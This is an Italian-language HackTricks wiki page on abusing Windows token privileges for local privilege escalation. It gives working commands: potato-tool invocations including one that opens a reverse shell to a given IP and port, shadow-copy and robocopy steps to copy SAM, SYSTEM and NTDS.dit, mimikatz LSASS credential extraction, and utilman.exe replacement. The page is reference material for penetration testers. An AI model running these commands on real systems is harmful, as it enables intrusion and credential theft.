# Abusing Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

Se **non sai cosa sono i Windows Access Tokens**, leggi questa pagina prima di continuare:


{{#ref}}
access-tokens.md
{{#endref}}

**Potresti riuscire a elevare i privilegi abusando dei token che già possiedi.**

### SeImpersonatePrivilege

Questo privilegio consente a un processo di impersonare (ma non creare) un token quando riesce a ottenerne un handle. È possibile acquisire un token privilegiato da un servizio Windows (DCOM), inducendolo a eseguire l'autenticazione NTLM verso un exploit e consentendo così l'esecuzione di un processo con privilegi SYSTEM.<sup>[[2]](#references)</sup> È possibile sfruttare questa primitiva con strumenti come [JuicyPotato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (che richiede che WinRM sia disabilitato), [SweetPotato](https://github.com/CCob/SweetPotato) e [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Un'applicazione web accessibile solo tramite loopback può costituire un vettore di coercion separato, se un utente locale può raggiungere un endpoint autenticato che effettua una richiesta a un URL scelto dal chiamante usando un'identità più privilegiata. Verifica le autorizzazioni dell'endpoint e le restrizioni sugli URL, l'identità effettiva del client in uscita e il suo comportamento di autenticazione, nonché la possibilità per quel client di raggiungere un listener controllato dall'utente con privilegi inferiori. La presenza di `SeImpersonatePrivilege` abilitato, di un listener IIS o di un parametro per recuperare un URL, da sola, non dimostra l'esistenza di un token privilegiato o di un percorso di escalation. Mantieni passiva questa verifica: durante l'enumerazione non inviare richieste di coercion. Consulta la documentazione Microsoft su [client impersonation](https://learn.microsoft.com/en-us/windows/win32/secauthz/client-impersonation) e [IIS application-pool identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities).

Note moderne per gli operatori:

- **JuicyPotato è legacy**: su Windows 10 1809+/Server 2019+, preferisci **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** o **PrintSpoofer**, a seconda della superficie RPC/COM ancora raggiungibile.
- Se hai compromesso un servizio eseguito come **`LOCAL SERVICE`** o **`NETWORK SERVICE`** e `whoami /priv` mostra un **filtered token** senza `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, ripristina prima il **set di privilegi predefinito** dell'account (per esempio con **FullPowers**) e poi riprova la famiglia potato.<sup>[[3]](#references)</sup>
- Alcuni fork più recenti sono più pratici per gli operatori rispetto agli strumenti originali. Per esempio, **SigmaPotato** aggiunge l'esecuzione tramite reflection/in-memory e la compatibilità con le versioni moderne di Windows, mentre **PrintNotifyPotato** abusa del servizio COM PrintNotify ed è spesso utile quando il percorso classico dello Spooler è disabilitato.

```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

È molto simile a **SeImpersonatePrivilege**: usa lo **stesso metodo** per ottenere un token privilegiato.\
Questo privilegio consente quindi di **assegnare un token primario** a un nuovo processo o a un processo sospeso. Con il token di impersonificazione privilegiato, puoi derivare un token primario (DuplicateTokenEx).\
Con il token, puoi creare un **nuovo processo** con 'CreateProcessAsUser' oppure creare un processo sospeso e **impostargli il token** (in generale, non puoi modificare il token primario di un processo in esecuzione).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

Se questo token è abilitato, puoi usare **KERB_S4U_LOGON** per ottenere un **token di impersonificazione** per qualsiasi altro utente senza conoscerne le credenziali, **aggiungere un gruppo arbitrario** (admins) al token, impostare il **livello di integrità** del token su "**medium**" e assegnare questo token al **thread corrente** (SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

Con questo privilegio, il sistema concede **l'accesso in lettura** a qualsiasi file (limitato alle operazioni di lettura). Viene usato per **leggere gli hash delle password degli account Local Administrator** dal registro; successivamente, è possibile usare strumenti come "**psexec**" o "**wmiexec**" con l'hash (tecnica Pass-the-Hash). Questa tecnica, tuttavia, non funziona in due casi: se l'account Local Administrator è disabilitato oppure se è applicata una policy che rimuove i diritti amministrativi agli account Local Administrators che si connettono da remoto.<sup>[[2]](#references)</sup>\
In pratica, il workflow integrato più affidabile è di solito **VSS + `robocopy /b`**: crea/esponi una shadow copy, poi copia `SAM`/`SYSTEM` o `NTDS.dit` in **modalità backup**, aggirando così gli ACL dei file.<sup>[[4]](#references)</sup>

```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```

Puoi **abusare di questo privilegio** con:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- seguendo **IppSec** in [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Oppure come spiegato nella sezione **escalating privileges with Backup Operators** di:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Questo privilegio consente **l'accesso in scrittura** a qualsiasi file di sistema, indipendentemente dalla Access Control List (ACL) del file. Offre numerose possibilità di escalation, tra cui la capacità di **modificare i servizi**, eseguire DLL Hijacking e impostare **debugger** tramite Image File Execution Options, oltre a varie altre tecniche.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege è un privilegio potente, particolarmente utile quando un utente è in grado di impersonare token, ma anche in assenza di SeImpersonatePrivilege. Questa capacità dipende dalla possibilità di impersonare un token che rappresenta lo stesso utente e il cui livello di integrità non supera quello del processo corrente.<sup>[[2]](#references)</sup>

**Punti chiave:**

- **Impersonazione senza SeImpersonatePrivilege:** è possibile sfruttare SeCreateTokenPrivilege per ottenere EoP impersonando token in condizioni specifiche.
- **Condizioni per l'impersonazione dei token:** per un'impersonazione riuscita, il token di destinazione deve appartenere allo stesso utente e avere un livello di integrità minore o uguale a quello del processo che tenta l'impersonazione.
- **Creazione e modifica dei token di impersonazione:** gli utenti possono creare un token di impersonazione e potenziarlo aggiungendo il SID (Security Identifier) di un gruppo privilegiato.

### SeLoadDriverPrivilege

Questo privilegio consente a un processo di **caricare e scaricare driver di dispositivo** creando una voce del registro con valori specifici di `ImagePath` e `Type`. Poiché l'accesso diretto in scrittura a `HKLM` (HKEY_LOCAL_MACHINE) è limitato, è possibile usare `HKCU` (HKEY_CURRENT_USER). Tuttavia, è necessario un percorso specifico affinché il kernel riconosca la voce `HKCU` come configurazione di un driver.<sup>[[2]](#references)</sup>

L'uso offensivo moderno consiste solitamente nel **BYOVD** (bring your own vulnerable driver): caricare un driver del kernel **firmato ma vulnerabile** e poi usarne gli IOCTL per disabilitare le protezioni o ottenere l'esecuzione di codice nel kernel. Tieni presente che nelle versioni recenti di Windows 11/Server, la **Microsoft vulnerable driver blocklist** e/o **HVCI/Memory Integrity** spesso impediscono il funzionamento delle vecchie chain pubbliche; quindi, gli esempi classici basati su `szkg64.sys` non sono più affidabili in tutti i casi.

Il percorso è `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, dove `<RID>` è il Relative Identifier dell'utente corrente. All'interno di `HKCU` va creato l'intero percorso e devono essere impostati due valori:<sup>[[2]](#references)</sup>

- `ImagePath`, ovvero il percorso del binario da eseguire
- `Type`, con valore `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Procedura:**

1. Accedi a `HKCU` invece che a `HKLM`, a causa delle restrizioni sull'accesso in scrittura.
2. Crea in `HKCU` il percorso `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, dove `<RID>` rappresenta il Relative Identifier dell'utente corrente.
3. Imposta `ImagePath` sul percorso di esecuzione del binario.
4. Imposta `Type` su `SERVICE_KERNEL_DRIVER` (`0x00000001`).

```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```

Altri modi per abusare di questo privilegio sono descritti in [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

È simile a **SeRestorePrivilege**. La sua funzione principale consente a un processo di **assumere la proprietà di un oggetto**, aggirando il requisito di accesso discrezionale esplicito tramite la concessione dei diritti di accesso WRITE_OWNER. Il processo consiste prima nell’assumere la proprietà della chiave di registro desiderata per poterla modificare, quindi nel modificare la DACL per consentire le operazioni di scrittura.<sup>[[2]](#references)</sup>

```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```

### SeDebugPrivilege

Questo privilegio consente di **eseguire il debug di altri processi**, anche leggendo e scrivendo nella memoria. Con questo privilegio è possibile impiegare diverse strategie di memory injection, in grado di eludere la maggior parte delle soluzioni antivirus e di host intrusion prevention.<sup>[[2]](#references)</sup>

Sulle versioni moderne di Windows, ricorda che `SeDebugPrivilege` è solitamente sufficiente per aprire **processi SYSTEM non protetti** e duplicarne i token, ma **non** garantisce di poter accedere a **LSASS**. Se **RunAsPPL / LSA Protection** è abilitato, i processi non protetti non possono leggere LSASS né iniettare codice al suo interno, anche se `SeDebugPrivilege` è presente. In tal caso, ruba un token da un altro processo SYSTEM non PPL oppure concatenane l'uso con un PPL bypass/BYOVD, invece di presumere che `procdump` funzioni. Per un esempio completo di copia del token con `SeDebugPrivilege` + `SeImpersonatePrivilege`, consulta [questa pagina](sedebug-+-seimpersonate-copy-token.md).

#### Eseguire il dump della memoria

Puoi usare [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) dalla [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) per **acquisire la memoria di un processo**. In particolare, questo può essere applicato al processo **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, responsabile della memorizzazione delle credenziali utente dopo che l'utente ha effettuato correttamente l'accesso al sistema.

Puoi quindi caricare questo dump in mimikatz per ottenere le password:

```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

Un dump LSASS leggibile salvato in precedenza potrebbe essere disponibile anche se l'account corrente non ha i permessi per acquisire il processo protetto in esecuzione. Considera un file dump o un archivio con un nome simile solo come un indizio: verifica l'accesso e i contenuti, poi controlla se le credenziali eventualmente recuperate sono ancora valide e consentono di ottenere un contesto con privilegi superiori. Il solo nome del file non dimostra che l'archivio contenga un dump né che le credenziali siano riutilizzabili.

#### RCE

Se vuoi ottenere una shell `NT SYSTEM`, puoi usare:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)

```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```

### SeManageVolumePrivilege

Questo diritto (Esegui attività di manutenzione dei volumi) può consentire operazioni privilegiate sui volumi, ma da solo non garantisce un handle leggibile al volume raw né l'accesso arbitrario ai file. Contano anche le ACL dei dispositivi, lo stato del token, la versione di Windows e l'operazione richiesta. Un'operazione di controllo del volume consentita può invece modificare le ACL del filesystem: si tratta di un'azione modificativa che può interessare l'intero volume. Su un host CA, l'abuso dei certificati richiede inoltre l'accesso a materiale utilizzabile della chiave privata; per i file protetti da EFS serve comunque una chiave di decrittazione o di ripristino autorizzata. Vedi i prerequisiti dettagliati qui sotto.<sup>[[5]](#references)</sup>

Vedi le tecniche dettagliate e le mitigazioni:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Verifica i privilegi

```
whoami /priv
```

I **tokens indicati come Disabled** di solito possono essere abilitati, quindi spesso puoi abusare sia dei privilegi _Enabled_ che di quelli _Disabled_.

### Abilitare tutti i tokens

Se hai privilegi disabilitati, puoi usare lo script [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) per abilitare tutti i tokens:

```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```

Oppure lo **script** incorporato in questo [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Tabella

La cheatsheet completa dei privilegi dei token è disponibile su [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin); il riepilogo seguente elenca solo i metodi diretti per sfruttare il privilegio e ottenere una sessione admin o leggere file sensibili.<sup>[[1]](#references)</sup>

| Privilegio                 | Impatto     | Strumento               | Percorso di esecuzione                                                                                                                                                                                                                                                                                                                            | Note                                                                                                                                                                                                                                                                                                                         |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **`SeAssignPrimaryToken`** | _**Admin**_ | strumento di terze parti | _"Consentirebbe a un utente di impersonare token e ottenere privesc fino a nt system usando strumenti come potato.exe, rottenpotato.exe e juicypotato.exe"_                                                                                                                                                                                        | Grazie ad [Aurélien Chalot](https://twitter.com/Defte_) per l'aggiornamento. Presto proverò a riformularlo come una procedura più pratica.                                                                                                                                                                                   |
| **`SeBackup`**             | **Minaccia** | _**Comandi integrati**_ | Leggere file sensibili con `robocopy /b` o helper di copia dedicati compatibili con SeBackup.                                                                                                                                                                                                                                                       | <p>- Ottimo per `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit` e, a volte, `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` è comodo, ma i cmdlet/API SeBackup dedicati sono spesso più flessibili per i file bloccati/aperti.</p>                                                                                                           |
| **`SeCreateToken`**        | _**Admin**_ | strumento di terze parti | Creare un token arbitrario, inclusi i diritti di amministratore locale, con `NtCreateToken`.                                                                                                                                                                                                                                                       |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Duplicare un token SYSTEM **non-PPL** o scaricare la memoria di un processo non protetto.                                                                                                                                                                                                                                                          | <p>Il dump di LSASS viene comunemente bloccato se RunAsPPL/LSA Protection è abilitato.</p><p>Lo script è disponibile su [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                   |
| **`SeImpersonate`**        | _**Admin**_ | strumento di terze parti | Usare la **famiglia Potato** / l'impersonificazione tramite named pipe per avviare SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, ecc.).                                                                                                                                                                  | <p>È più pratico con account di servizio come IIS APPPOOL, MSSQL, attività pianificate o qualsiasi contesto che disponga già di `SeImpersonatePrivilege`.</p>                                                                                                                                                                 |
| **`SeLoadDriver`**         | _**Admin**_ | strumento di terze parti | <p>1. Caricare un driver kernel firmato ma vulnerabile (BYOVD)<br>2. Usare gli IOCTL del driver per ottenere accesso kernel in lettura/scrittura, disabilitare gli strumenti di sicurezza o ottenere privilegi SYSTEM<br><br>In alternativa, il privilegio può essere usato per scaricare driver relativi alla sicurezza con il comando integrato <code>fltMC</code>, ad es. <code>fltMC sysmondrv</code></p> | <p>I vecchi driver pubblici come <code>szkg64.sys</code> vengono sempre più spesso bloccati sui sistemi Windows moderni dalla blocklist dei driver vulnerabili / da HVCI.</p>                                                                                                                                                   |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Avviare PowerShell/ISE con il privilegio SeRestore presente.<br>2. Abilitare il privilegio con <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Rinominare utilman.exe in utilman.old<br>4. Rinominare cmd.exe in utilman.exe<br>5. Bloccare la console e premere Win+U</p> | <p>L'attacco potrebbe essere rilevato da alcuni software AV.</p><p>Un metodo alternativo si basa sulla sostituzione dei file binari dei servizi archiviati in "Program Files" usando lo stesso privilegio.</p>                                                                                                                  |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Comandi integrati**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Rinominare cmd.exe in utilman.exe<br>4. Bloccare la console e premere Win+U</p>                                                                                                                                  | <p>L'attacco potrebbe essere rilevato da alcuni software AV.</p><p>Un metodo alternativo si basa sulla sostituzione dei file binari dei servizi archiviati in "Program Files" usando lo stesso privilegio.</p>                                                                                                               |
| **`SeTcb`**                | _**Admin**_ | strumento di terze parti | <p>Manipolare i token per includere i diritti di amministratore locale. Potrebbe essere necessario SeImpersonate.</p><p>Da verificare.</p>                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin - percorsi di sfruttamento dai privilegi Windows all'admin](https://github.com/gtworek/Priv2Admin)
- [2] [Abuso dei privilegi dei token per LPE](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – Ridatemi i miei privilegi! Per favore?](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (la modalità di backup `/b` ignora i controlli ACL di file/cartelle)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – Eseguire attività di manutenzione dei volumi (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate (SeManageVolumePrivilege → esfiltrazione della chiave CA → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)
{{#include ../../banners/hacktricks-training.md}}
